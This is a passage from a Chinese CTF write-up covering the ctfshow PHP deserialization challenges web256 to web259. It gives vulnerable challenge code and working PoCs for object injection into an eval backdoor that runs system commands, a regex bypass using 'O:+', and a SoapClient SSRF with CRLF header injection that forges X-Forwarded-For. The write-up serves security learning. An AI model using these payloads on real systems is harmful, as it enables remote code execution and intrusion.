<span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;username!==<span class="keyword">$this</span>-&gt;password)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;checkVip())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;vipOneKeyGetFlag();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析：</p><p>即要满足</p><ul><li>类成员 <code>isVip</code> 为 true</li><li>传入的 <code>username</code> 和 类成员 <code>username</code> 相等</li><li>传入的 <code>password</code> 和 类成员 <code>password</code> 相等</li><li>类的 username 和 password 不等（原来是相等的）</li></ul><p>因为通过反序列化修改原有数据即可</p><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line"><span class="variable">$user</span>-&gt;isVip = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$user</span>-&gt;username = <span class="string">&#x27;6&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$user</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617609996575-52aae14a-9b59-4ca8-ac3b-6a44c3929973.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617609996575-52aae14a-9b59-4ca8-ac3b-6a44c3929973.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web257-简单POP链"><a href="#web257-简单POP链" class="headerlink" title="web257 简单POP链"></a>web257 简单POP链</h2><span class='btn'><a class="button"  title='nginx/1.16.1'><i class='fas fa-tag'></i>nginx/1.16.1</a></span> <span class='btn'><a class="button"  title='PHP/7.3.11'><i class='fas fa-tag'></i>PHP/7.3.11</a></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 20:33:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> info();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析：</p><p>触发 backDoor 即可</p><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span> = <span class="string">&#x27;system(&quot;cat ./flag.php&quot;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line"><span class="keyword">echo</span>(urlencode(serialize(<span class="variable">$user</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616256960065-2a3679a8-6e00-4e5e-8e9e-c0c90093ae8b.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616256960065-2a3679a8-6e00-4e5e-8e9e-c0c90093ae8b.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web258-正则"><a href="#web258-正则" class="headerlink" title="web258 正则"></a>web258 正则</h2><span class='btn'><a class="button"  title='PHP/5.6.40'><i class='fas fa-tag'></i>PHP/5.6.40</a></span> <span class='btn'><a class="button"  title='正则绕过'><i class='fas fa-tag'></i>正则绕过</a></span> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 21:38:56</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> info();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析：</p><p>绕过正则 <code>/[oc]:\d+:/i</code> , 其实就是 <code>C:数字</code> 或 O<code>:数字</code> 不连续，这里只需让 <code>O:11</code> 不连续即可，比如 <code>O:+11</code></p><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&#x27;system(&quot;cat flag.php&quot;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line"><span class="variable">$user_replace</span> = preg_replace(<span class="string">&#x27;/([oc]\:)(\d+)/i&#x27;</span>, <span class="string">&#x27;$1+$2&#x27;</span>, serialize(<span class="variable">$user</span>));</span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="variable">$user_replace</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617611153992-4b358d11-62b0-4e5c-a666-eab0b0cc0a3c.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617611153992-4b358d11-62b0-4e5c-a666-eab0b0cc0a3c.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>图中 <code>%2b</code> 为 <code>+</code> 的 url编码</p><h2 id="web259-SSRF-CRLF-SoapClient"><a href="#web259-SSRF-CRLF-SoapClient" class="headerlink" title="web259 SSRF + CRLF + SoapClient"></a>web259 SSRF + CRLF + SoapClient</h2><span class='btn'><a class="button"  title='PHP/7.3.11'><i class='fas fa-tag'></i>PHP/7.3.11</a></span> <span class='btn'><a class="button"  title='SSRF'><i class='fas fa-tag'></i>SSRF</a></span> <span class='btn'><a class="button"  title='CRLF'><i class='fas fa-tag'></i>CRLF</a></span> <span class='btn'><a class="button"  title='SoapClient'><i class='fas fa-tag'></i>SoapClient</a></span><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$vip</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br><span class="line"><span class="comment">//vip can get flag one key</span></span><br><span class="line"><span class="variable">$vip</span>-&gt;getFlag();</span><br></pre></td></tr></table></figure><p>flag.php (大概如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xff</span> = explode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line">array_pop(<span class="variable">$xff</span>);</span><br><span class="line"><span class="variable">$ip</span> = array_pop(<span class="variable">$xff</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!==<span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$token</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$token</span>==<span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">        file_put_contents(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析：</p><p>不就 XFF伪造？</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616294322022-f90e1c7d-c592-4d3d-82a3-48d22b7b5a56.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616294322022-f90e1c7d-c592-4d3d-82a3-48d22b7b5a56.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>估计给的代码是不完整的，还真实 IP 判断，估计大概是这样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag_tari&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$xff</span> = explode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line">array_pop(<span class="variable">$xff</span>);</span><br><span class="line"><span class="variable">$ip</span> = array_pop(<span class="variable">$xff</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$ip</span>!==<span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$token</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$token</span>==<span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">            file_put_contents(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="variable">$flag</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your ip not 127.0.0.1&quot;</span>;</span><br></pre></td></tr></table></figure><p>搜了一波，奇怪的知识增加了，除了XFF，本题还用到 SSRF(SoapClient)+CRLF组合拳，毕竟我们的 index.php 还有用到呢</p><p>需要利用 SSRF 访问 flag.php 并构造 XFF 和 POST 数据，SSRF漏洞在哪呢？</p><p>SoapClient类 <code>__call</code> 魔术方法</p><blockquote><p>__call() 魔术方法：当调用一个类不存在的方法时候会触发这个魔术方法</p><p>当调用 SoapClient 类的 __call() 魔术方法的时候，会发送一个 POST 请求，请求的参数由着 SoapClient 类的一些参数决定。</p></blockquote><p>因此，当我们运行 <code>index.php</code> 的 <code>$vip-&gt;getFlag();</code> 方法时，会因 <code>SoapClient</code> 不存在 <code>getFlag</code> 方法而调用 <code>__call()</code> 魔术方法，进而发送一个 POST 请求</p><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;token=ctfshow&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$soap</span> = <span class="keyword">new</span> SoapClient(</span><br><span class="line">    <span class="literal">null</span>, </span><br><span class="line">    <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;uri&#x27;</span>=&gt; <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&quot;edge\r\nX-Forwarded-For:127.0.0.1,127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded&quot;</span>.<span class="string">&quot;\r\nContent-Length: &quot;</span>.(<span class="keyword">string</span>)strlen(<span class="variable">$post_string</span>).<span class="string">&quot;\r\n\r\n&quot;</span>.<span class="variable">$post_string</span>,</span><br><span class="line">        <span class="comment">// &#x27;user_agent&#x27;=&gt;&quot;edge\x0D\x0AX-Forwarded-For:127.0.0.1,127.0.0.1\x0D\x0AContent-Type: application/x-www-form-urlencoded&quot;.&quot;\x0D\x0AContent-Length: &quot;.(string)strlen($post_string).&quot;\x0D\x0A\x0D\x0A&quot;.$post_string,</span></span><br><span class="line">        )</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(urlencode(serialize(<span class="variable">$soap</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里注意下，包含特殊字符转义的，比如 <code>\r\n</code> 要用双引号 <code>&quot;</code> 单引号保持原来的语义的。</p><p><img 